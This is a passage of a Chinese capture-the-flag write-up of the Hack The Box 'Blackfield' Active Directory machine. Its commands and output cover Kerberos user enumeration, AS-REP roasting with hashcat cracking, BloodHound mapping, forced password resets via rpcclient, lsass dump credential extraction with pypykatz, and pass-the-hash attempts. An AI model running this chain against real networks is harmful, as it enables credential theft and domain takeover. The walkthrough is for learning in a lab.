Thu Jun  4 00:47:12 2020<br>  ..                                  D        0  Thu Jun  4 00:47:12 2020<br><br>                5102079 blocks of size 4096. 1683359 blocks available<br>smb: \ZWausik\&gt; <span class="hljs-built_in">cd</span> ..<br>smb: \&gt; <span class="hljs-built_in">cd</span> ZMiick\<br>smb: \ZMiick\&gt; <span class="hljs-built_in">dir</span><br>  .                                   D        0  Thu Jun  4 00:47:12 2020<br>  ..                                  D        0  Thu Jun  4 00:47:12 2020<br><br>                5102079 blocks of size 4096. 1683355 blocks available<br>smb: \ZMiick\&gt; <br></code></pre></td></tr></table></figure><p>而且很奇怪，这些目录名像是人名，因为KAmavisca是翻译不出来的，但是Amavisca翻译软件会告诉我这是一个人名，我可以试试，将其复制下来做成字典，用于kerberos枚举用户名。</p><p>我可以先尝试将其挂载到本地mnt目录，该功能需要切换root：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ su root                                         <br>密码：<br><br><span class="hljs-comment"># mount -t cifs //10.10.10.192/profiles$ /mnt</span><br>Password <span class="hljs-keyword">for</span> worldisend@//10.10.10.192/profiles$:                                      <br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220422235129503.png" alt="image-20220422235129503"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">touch</span> user.txt                                  <br>$ sudo <span class="hljs-built_in">ls</span> -1 /mnt/ &gt; user.txt<br>$ <span class="hljs-built_in">cat</span> user.txt<br>AAlleni<br>ABarteski<br>..........<br></code></pre></td></tr></table></figure><p>这样我就可以获取一个用户名字典。</p><h4 id="kerberos枚举："><a href="#kerberos枚举：" class="headerlink" title="kerberos枚举："></a>kerberos枚举：</h4><p>那么接下来我可以通过kerbrute枚举用户名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo ./kerbrute userenum -d blackfield.local ./user.txt --dc 10.10.10.192<br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: v1.0.3 (9dad6e1) - 04/23/22 - Ronnie Flathers @ropnop<br><br>2022/04/23 00:09:35 &gt;  Using KDC(s):<br>2022/04/23 00:09:35 &gt;   10.10.10.192:88<br><br>2022/04/23 00:09:58 &gt;  [+] VALID USERNAME:       audit2020@blackfield.local<br>2022/04/23 00:12:08 &gt;  [+] VALID USERNAME:       support@blackfield.local<br>2022/04/23 00:12:08 &gt;  [+] VALID USERNAME:       svc_backup@blackfield.local<br>2022/04/23 00:12:40 &gt;  Done! Tested 314 usernames (3 valid) <span class="hljs-keyword">in</span> 184.849 seconds<br></code></pre></td></tr></table></figure><p>我可以进一步提取信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">audit2020<br>support<br>svc_backup<br></code></pre></td></tr></table></figure><p>我可以&#x2F;impacket-0.9.24&#x2F;examples&#x2F;GetNPUsers.py来枚举这些用户的hash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./posttool/impacket-0.9.24/examples/GetNPUsers.py <span class="hljs-string">&#x27;blackfield.local/&#x27;</span> -usersfile ./user.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.192  <br>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation<br><br>[-] User audit2020 doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User svc_backup doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br></code></pre></td></tr></table></figure><p>我成功获取到了support用户的hash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> hashes.txt       <br>$krb5asrep$23<span class="hljs-variable">$support</span>@BLACKFIELD.LOCAL:5854f53c662b7bb4e4a4cdfd7ebc05d4<span class="hljs-variable">$4aac3b42f477d32a10ef1fa40e8ede2cb818b3f4a5562c2f348aefb1d1a913119bcc9b4f836598a3afba64a2a17e227043ddcee34ac8e6667cc4ca8d3e8f6dd3a861fc2084d5f46a4754c41c551716473bdee459abe64164ddd1d1758a4b977fb98a9b71e5493f8297a064125cff6fce8aa1c106d6aed6f1441093ac9c8a0cb8deef3dce2583dae8b27e9580a3a2831df29925a1ccb428e42d360aa02b4f483aee94cf8ec118335865bde6ff6aee9d86da08781b00fe77dc40b1db6f45589f9ae63e3c063c7ec5a7411c0534d583719e8a50a3708e84d6a5008dd151d8100afa4baf094d72b86cdb95f6ea08a2845c4772608a20</span><br></code></pre></td></tr></table></figure><p>我可以尝试用hashcat破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hashcat -h | grep <span class="hljs-string">&quot;AS-REP&quot;</span>                                          <br>  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hashcat -m 18200 ./hashes.txt /usr/share/wordlists/rockyou.txt --force       <br>hashcat (v6.2.5) starting<br>......<br>* Create more work items to make use of your parallelization power:<br>  https://hashcat.net/faq/morework<br><br>$krb5asrep$23<span class="hljs-variable">$support</span>@BLACKFIELD.LOCAL:5854f53c662b7bb4e4a4cdfd7ebc05d4<span class="hljs-variable">$4aac3b42f477d32a10ef1fa40e8ede2cb818b3f4a5562c2f348aefb1d1a913119bcc9b4f836598a3afba64a2a17e227043ddcee34ac8e6667cc4ca8d3e8f6dd3a861fc2084d5f46a4754c41c551716473bdee459abe64164ddd1d1758a4b977fb98a9b71e5493f8297a064125cff6fce8aa1c106d6aed6f1441093ac9c8a0cb8deef3dce2583dae8b27e9580a3a2831df29925a1ccb428e42d360aa02b4f483aee94cf8ec118335865bde6ff6aee9d86da08781b00fe77dc40b1db6f45589f9ae63e3c063c7ec5a7411c0534d583719e8a50a3708e84d6a5008dd151d8100afa4baf094d72b86cdb95f6ea08a2845c4772608a20</span>:<span class="hljs-comment">#00^BlackKnight</span><br>......<br>Started: Sat Apr 23 00:20:55 2022<br>Stopped: Sat Apr 23 00:21:16 2022<br></code></pre></td></tr></table></figure><h4 id="继续枚举smb："><a href="#继续枚举smb：" class="headerlink" title="继续枚举smb："></a>继续枚举smb：</h4><p>我得到了<strong>support</strong>用户的密码 <strong>#00^BlackKnight</strong>，但它似乎不是让我用来登录的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i 10.10.10.192 -u support -p <span class="hljs-string">&#x27;#00^BlackKnight&#x27;</span><br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">dir</span><br></code></pre></td></tr></table></figure><p>而且似乎也不允许我以该身份去访问一些东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.192/forensic -U support%<span class="hljs-comment">#00^BlackKnight   </span><br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">dir</span><br>NT_STATUS_ACCESS_DENIED listing \*<br>smb: \&gt; <br></code></pre></td></tr></table></figure><p>好吧，我还是可以访问到一些最开始的限制目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.192/SYSVOL -U support%<span class="hljs-comment">#00^BlackKnight</span><br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">dir</span><br>  .                                   D        0  Sun Feb 23 19:13:05 2020<br>  ..                                  D        0  Sun Feb 23 19:13:05 2020<br>  BLACKFIELD.<span class="hljs-built_in">local</span>                   Dr        0  Sun Feb 23 19:13:05 2020<br><br>                5102079 blocks of size 4096. 1683607 blocks available<br>smb: \&gt; <span class="hljs-built_in">cd</span> BLACKFIELD.<span class="hljs-built_in">local</span>\<br>smb: \BLACKFIELD.<span class="hljs-built_in">local</span>\&gt; DIR<br>  .                                   D        0  Sun Feb 23 19:19:28 2020<br>  ..                                  D        0  Sun Feb 23 19:19:28 2020<br>  DfsrPrivate                      DHSr        0  Sun Feb 23 19:19:28 2020<br>  Policies                            D        0  Sun Feb 23 19:13:14 2020<br>  scripts                             D        0  Sun Feb 23 19:13:05 2020<br><br>                5102079 blocks of size 4096. 1683575 blocks available<br></code></pre></td></tr></table></figure><p>但其中包含的文件似乎对我一点帮助都没有，而且有些目录中还是不允许我执行 dir 遍历命令，我尝试以当前身份去请求一个服务票据，如果能请求成功，或许我可以破解服务账户的凭证密码，但是看起来不行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./GetUserSPNs.py -request -dc-ip 10.10.10.192 <span class="hljs-string">&#x27;blackfield.local/support:#00^BlackKnight&#x27;</span><br>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation<br><br>No entries found!<br></code></pre></td></tr></table></figure><h4 id="枚举域信息："><a href="#枚举域信息：" class="headerlink" title="枚举域信息："></a>枚举域信息：</h4><p>但是，我发现了一个<a href="https://github.com/fox-it/BloodHound.py">BloodHound 注入器 BloodHound.py</a>，它可以指定用户登录凭证远程对目标域进行嗅探：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./bloodhound.py -c ALL -u support -p <span class="hljs-string">&#x27;#00^BlackKnight&#x27;</span> -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192<br>INFO: Found AD domain: blackfield.local<br>INFO: Connecting to LDAP server: dc01.blackfield.local<br>INFO: Found 1 domains<br>INFO: Found 1 domains <span class="hljs-keyword">in</span> the forest<br>INFO: Found 18 computers<br>INFO: Connecting to LDAP server: dc01.blackfield.local<br>INFO: Found 316 <span class="hljs-built_in">users</span><br>INFO: Connecting to GC LDAP server: dc01.blackfield.local<br>......<br></code></pre></td></tr></table></figure><p>运行完毕后会在当前目录生成对应的json文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">mkdir</span> ../../../json<br>$ <span class="hljs-built_in">mv</span> 20* ../../../json<br>$ <span class="hljs-built_in">cd</span> ../../../json<br>$ <span class="hljs-built_in">ls</span><br>20220423095228_computers.json  20220423095228_domains.json  20220423095228_groups.json  20220423095228_users.json<br></code></pre></td></tr></table></figure><p>我可以将其载入到bloodhound中，我可以先定位当前用户 support 的节点并点击它，Node info中便会为我列出一些当前用户的详细信息，以及一些预定义的搜索：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423100633124.png" alt="image-20220423100633124"  /><p>浏览一遍大概后，往下拉，会有一个First Degree Object Control（一级控制对象），也就是我们能够直接控制的对象：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423100950197.png" alt="image-20220423100950197"  /><p>如果不知道该权限具体代表什么含义，可以将鼠标移动到权限英文单词上右键help，bloodhound会很贴心的解释一些该权限的含义：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423101230308.png" alt="image-20220423101230308"  /><p>正如它述说，我所使用的当前用户<strong>support</strong>可以在不知道<strong>AUDIT2020</strong>用户密码的情况下，更改它的密码，而这个账户是我一开始枚举kerberos用户时也曾枚举到的，Bloodhound同样贴心的给我提供了一些参考示例：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220423101805167.png" alt="image-20220423101805167"  /><p>但是该参考示例需要导入PowerView，那我需要登录到目标机器中，但是目前，我没有办法做到这一点。</p><h4 id="利用RPC重置windows密码："><a href="#利用RPC重置windows密码：" class="headerlink" title="利用RPC重置windows密码："></a>利用RPC重置windows密码：</h4><p>首先我要以support身份链接RPC：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ rpcclient -U support //10.10.10.192<br>Enter WORKGROUP\support<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">rpcclient $&gt; </span><br></code></pre></td></tr></table></figure><p>可以通过不带任何参数的setuserinfo2命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; setuserinfo2<br>Usage: setuserinfo2 username level password [password_expired]<br>result was NT_STATUS_INVALID_PARAMETER<br>rpcclient $<br></code></pre></td></tr></table></figure><p>它返回了报错信息，说是无效的参数，间接的说明了我当前使用的support是有权限使用该命令的，那么我可以输入以下格式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setuserinfo2 &lt;user&gt; 23 <span class="hljs-string">&#x27;&lt;new_pass&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>为什么是23我暂时无法得知，我看到很多演示都是用的23，或许是它语法规范要求这么写，因为是要更改域用户的密码，密码是因当要符合域内密码策略的，我可以通过以下命令得知密码策略：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; getdompwinfo<br>min_password_length: 7<br>password_properties: 0x00000001<br>        DOMAIN_PASSWORD_COMPLEX<br></code></pre></td></tr></table></figure><p>它的最小密码长度为7，但是为了避免其他不必要的麻烦，我会选择用一个符合大多数标准的密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; setuserinfo2 audit2020  23 <span class="hljs-string">&#x27;worldisend123!@#&#x27;</span><br>rpcclient $&gt; <br></code></pre></td></tr></table></figure><p>它什么信息都没返回，只要没返回报错信息，或许我可以当他是成功了，但奇怪的是我还是无法登录目标：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i 10.10.10.192 -u audit2020 -p <span class="hljs-string">&#x27;worldisend123!@#&#x27;</span><br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine                                                                                                                               <br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br><br></code></pre></td></tr></table></figure><p>是我没修改成功么？</p><h4 id="再访smb："><a href="#再访smb：" class="headerlink" title="再访smb："></a>再访smb：</h4><p>或许我可以再去smb共享中查看一下，因为它还是有很多限制级的文件夹，SMBMAP可以快速的根据我提供给它的身份认证信息帮我枚举出我能够访问的共享目录信息，Kalinux默认集成该工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.192 -u audit2020 -p <span class="hljs-string">&#x27;worldisend123!@#&#x27;</span><br>[+] IP: 10.10.10.192:445        Name: 10.10.10.192                                      <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        ADMIN$                                                  NO ACCESS       Remote Admin<br>        C$                                                      NO ACCESS       Default share<br>        forensic                                                READ ONLY       Forensic / Audit share.<br>        IPC$                                                    READ ONLY       Remote IPC<br>        NETLOGON                                                READ ONLY       Logon server share <br>        profiles$                                               READ ONLY<br>        SYSVOL                                                  READ ONLY       Logon server share <br></code></pre></td></tr></table></figure><p>看起来我可以访问forensic了，的确如此：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient -U audit2020 //10.10.10.192/forensic <span class="hljs-string">&#x27;worldisend123!@#&#x27;</span><br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">dir</span><br>  .                                   D        0  Sun Feb 23 21:03:16 2020<br>  ..                                  D        0  Sun Feb 23 21:03:16 2020<br>  commands_output                     D        0  Mon Feb 24 02:14:37 2020<br>  memory_analysis                     D        0  Fri May 29 04:28:33 2020<br>  tools                               D        0  Sun Feb 23 21:39:08 2020<br><br>                5102079 blocks of size 4096. 1681331 blocks available<br>smb: \&gt; <br></code></pre></td></tr></table></figure><p>而且作者似乎提前为我准备了很多信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \commands_output\&gt; <span class="hljs-built_in">dir</span><br>  .                                   D        0  Mon Feb 24 02:14:37 2020<br>  ..                                  D        0  Mon Feb 24 02:14:37 2020<br>  domain_admins.txt                   A      528  Sun Feb 23 21:00:19 2020<br>  domain_groups.txt                   A      962  Sun Feb 23 20:51:52 2020<br>  domain_users.txt                    A    16454  Sat Feb 29 06:32:17 2020<br>  firewall_rules.txt                  A   518202  Sun Feb 23 20:53:58 2020<br>  ipconfig.txt                        A     1782  Sun Feb 23 20:50:28 2020<br>  netstat.txt                         A     3842  Sun Feb 23 20:51:01 2020<br>  route.txt                           A     3976  Sun Feb 23 20:53:01 2020<br>  systeminfo.txt                      A     4550  Sun Feb 23 20:56:59 2020<br>  tasklist.txt                        A     9990  Sun Feb 23 20:54:29 2020<br></code></pre></td></tr></table></figure><p>里边有一个我从未见过的新管理员用户<strong>Ipwn3dYourCompany</strong> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> domain_admins.txt <br>��Group name     Domain Admins<br>Comment        Designated administrators of the domain<br><br>Members<br><br>-------------------------------------------------------------------------------<br>Administrator       Ipwn3dYourCompany     <br>The <span class="hljs-built_in">command</span> completed successfully.<br></code></pre></td></tr></table></figure><p>在另一个目录中我发现了lsass.zip，lsass 是 Windows 中处理身份验证和安全策略的本地安全机构子系统服务。基本上，它在其内存空间中保存着各种身份验证信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \memory_analysis\&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Fri May 29 04:28:33 2020<br>  ..                                  D        0  Fri May 29 04:28:33 2020<br>  conhost.zip                         A 37876530  Fri May 29 04:25:36 2020<br>  ctfmon.zip                          A 24962333  Fri May 29 04:25:45 2020<br>  dfsrs.zip                           A 23993305  Fri May 29 04:25:54 2020<br>  dllhost.zip                         A 18366396  Fri May 29 04:26:04 2020<br>  ismserv.zip                         A  8810157  Fri May 29 04:26:13 2020<br>  lsass.zip                           A 41936098  Fri May 29 04:25:08 2020<br>  mmc.zip                             A 64288607  Fri May 29 04:25:25 2020<br>  RuntimeBroker.zip                   A 13332174  Fri May 29 04:26:24 2020<br>  ServerManager.zip                   A 131983313  Fri May 29 04:26:49 2020<br>  sihost.zip                          A 33141744  Fri May 29 04:27:00 2020<br>  smartscreen.zip                     A 33756344  Fri May 29 04:27:11 2020<br>  svchost.zip                         A 14408833  Fri May 29 04:27:19 2020<br>  taskhostw.zip                       A 34631412  Fri May 29 04:27:30 2020<br>  winlogon.zip                        A 14255089  Fri May 29 04:27:38 2020<br>  wlms.zip                            A  4067425  Fri May 29 04:27:44 2020<br>  WmiPrvSE.zip                        A 18303252  Fri May 29 04:27:53 2020<br><br>                5102079 blocks of size 4096. 1681316 blocks available<br>smb: \memory_analysis\&gt; get lsass.zip <br></code></pre></td></tr></table></figure><p>我可以通过pypykatz工具从内存转储中提取凭据，Pypykatz 是 Mimikatz 的 Python 版本，Kalinux默认集成，它毕竟包含了目标进程中所有的身份凭据，可能会很多，为了阅读方便，我添加了一个|more让其显示到more暂停：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ unzip lsass.zip                   <br>Archive:  lsass.zip<br>  inflating: lsass.DMP<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pypykatz lsa minidump lsass.DMP |more<br></code></pre></td></tr></table></figure><p>首先我拿到了svc_backup用户的凭证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ pypykatz lsa minidump lsass.DMP |more        <br>INFO:root:Parsing file lsass.DMP<br>FILE: ======== lsass.DMP =======<br>== LogonSession ==<br>authentication_id 406458 (633ba)<br>session_id 2<br>username svc_backup<br>domainname BLACKFIELD<br>logon_server DC01<br>logon_time 2020-02-23T18:00:03.423728+00:00<br>sid S-1-5-21-4194615774-2175524697-3563712290-1413<br>luid 406458<br>        == MSV ==<br>                Username: svc_backup<br>                Domain: BLACKFIELD<br>                LM: NA<br>                NT: 9658d1d1dcd9250115e2205d9f48400d<br>                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c<br>                DPAPI: a03cd8e9d30171f3cfe8caad92fef621<br>        == WDIGEST [633ba]==<br>                username svc_backup<br>                domainname BLACKFIELD<br>                password None<br>        == Kerberos ==<br>                Username: svc_backup<br>                Domain: BLACKFIELD.LOCAL<br>        == WDIGEST [633ba]==<br>                username svc_backup<br>                domainname BLACKFIELD<br>                password None<br></code></pre></td></tr></table></figure><p>再往下还会有Administrator的凭证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">== LogonSession ==<br>authentication_id 153705 (25869)<br>session_id 1<br>username Administrator<br>domainname BLACKFIELD<br>logon_server DC01<br>logon_time 2020-02-23T17:59:04.506080+00:00<br>sid S-1-5-21-4194615774-2175524697-3563712290-500<br>luid 153705<br>        == MSV ==<br>                Username: Administrator<br>                Domain: BLACKFIELD<br>                LM: NA<br>                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62<br>                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368<br>                DPAPI: 240339f898b6ac4ce3f34702e4a89550<br>        == WDIGEST [25869]==<br>                username Administrator<br>                domainname BLACKFIELD<br>                password None<br>        == Kerberos ==<br>                Username: Administrator<br>                Domain: BLACKFIELD.LOCAL<br>        == WDIGEST [25869]==<br>                username Administrator<br>                domainname BLACKFIELD<br>                password None<br>        == DPAPI [25869]==<br>                luid 153705<br>                key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e<br>                masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5<br>                sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9<br></code></pre></td></tr></table></figure><h4 id="以svc-backup身份登录目标："><a href="#以svc-backup身份登录目标：" class="headerlink" title="以svc_backup身份登录目标："></a>以svc_backup身份登录目标：</h4><p>我可以尝试用Administrator哈希去PTH移动的目标机器，但是我还是登录不上去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -u administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 -i 10.10.10.192<br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is 